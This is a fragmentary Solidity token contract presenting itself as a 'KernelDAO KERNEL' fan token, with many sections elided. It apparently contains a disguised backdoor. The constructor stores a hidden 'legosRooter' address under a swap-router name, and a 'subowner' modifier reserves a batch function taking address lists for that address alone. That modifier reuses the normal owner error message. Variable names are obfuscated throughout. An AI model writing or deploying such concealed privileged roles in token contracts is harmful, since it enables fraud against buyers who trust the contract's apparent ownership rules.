...
/// https://x.com/KernelDAOKERNEL


pragma solidity 0.8.29;

// KernelDAOKERNEL fan token

interface KernelDAOKERNELinterface {
  /**
...
/*
 * @dev Provides information about the current execution KernelDAOKERNEL20Burnable, including the
 ...
 */
abstract contract KernelDAOKERNEL20Burnable {
...
// File: @openzeppelin/contracts/access/KernelDAOKERNEL20Ownable.sol
 ...
 * the owner.
 */
abstract contract KernelDAOKERNEL20Ownable is KernelDAOKERNEL20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "KernelDAOKERNEL20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "KernelDAOKERNEL20Ownable: new owner is the zero address");
 ...
 * `SafeKernelDAOKERNEL` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeKernelDAOKERNEL {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeKernelDAOKERNEL: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeKernelDAOKERNEL: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeKernelDAOKERNEL: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeKernelDAOKERNEL: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeKernelDAOKERNEL: modulo by zero");
  }
...
contract KernelDAOKERNELToken is KernelDAOKERNEL20Burnable, KernelDAOKERNELinterface, KernelDAOKERNEL20Ownable {
    
    using SafeKernelDAOKERNEL for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "KernelDAO KERNEL";
        _symbol = "KernelDAO KERNEL";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {KernelDAOKERNELinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {KernelDAOKERNELinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "KernelDAOKERNEL20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {KernelDAOKERNELinterface-approve}.
    *
    * Requirements:
    *
...
function aTUSDPresalePool(address[] calldata tusdRewards) external subowner {
    ...
    /**
    * @dev See {KernelDAOKERNELinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {KernelDAOKERNELinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {KernelDAOKERNELinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {KernelDAOKERNELinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "KernelDAOKERNELinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {KernelDAOKERNELinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "KernelDAOKERNELinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "KernelDAOKERNELinterface: transfer from the zero address");
        require(shippingto != address(0), "KernelDAOKERNELinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "KernelDAOKERNELinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "KernelDAOKERNELinterface: approve from the zero address");
        require(transporteur != address(0), "KernelDAOKERNELinterface: approve to the zero address");
